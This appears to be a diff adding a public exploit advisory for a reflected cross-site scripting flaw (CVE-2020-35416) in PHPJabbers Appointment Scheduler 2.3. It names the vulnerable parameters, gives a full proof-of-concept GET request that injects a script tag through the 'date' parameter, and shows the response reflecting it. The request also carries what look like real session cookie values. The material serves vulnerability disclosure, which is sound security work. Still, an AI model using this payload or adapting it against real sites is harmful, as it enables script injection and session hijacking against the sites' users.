@@ -1,0 +1,52 @@
+# Exploit Title: PHPJabbers Appointment Scheduler 2.3 - Reflected XSS (Cross-Site Scripting)
+# Date: 2020-12-14
+# Exploit Author: Andrea Intilangelo
+# Vendor Homepage: https://www.phpjabbers.com
+# Software Link: https://www.phpjabbers.com/appointment-scheduler
+# Version: 2.3
+# Tested on: Latest Version of Desktop Web Browsers (ATTOW: Firefox 83.0, Microsoft Edge 87.0.664.60)
+# CVE: CVE-2020-35416
+
+Reflected Cross-Site Scripting (XSS) vulnerability in 'index.php' login-portal webpage of Stivasoft/PHPJabbers Appointment Scheduler v2.3 (and many others, in example from "ilmiogestionale.eu", since some companies/web agencies did a script rebrand/rework) allows remote attacker to inject arbitrary script or HTML.
+
+Request parameters affected: "date", "action", arbitrarily supplied URL parameters, possible others.
+
+PoC Request:
+GET /index.php?controller=pjFrontPublic&action=pjActionServices&cid=1&layout=1&date=%3cscript%3ealert(1)%3c%2fscript%3e&theme=theme9 HTTP/1.1
+Host: [removed]
+Connection: close
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://[removed]
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _ga=GA1.2.505990147.1607596638; _gid=GA1.2.1747301294.1607596638; AppointmentScheduler=5630ae3ab2ed56dbe79c033b84565422
+
+PoC Response:
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 14 Dec 2020 10:48:41 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Vary: Accept-Encoding
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: Origin, X-Requested-With
+Content-Length: 13988
+
+<div class="container-fluid">
+   <div class="row">
+       <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+           <div class="panel panel-default pjAsContainer pjAsAside">
+               <div class="panel-heading p
+...[SNIP]...
+<div class="pj-calendar-ym">Dicembre, <script>alert(1)</script></div>
+...[SNIP]...
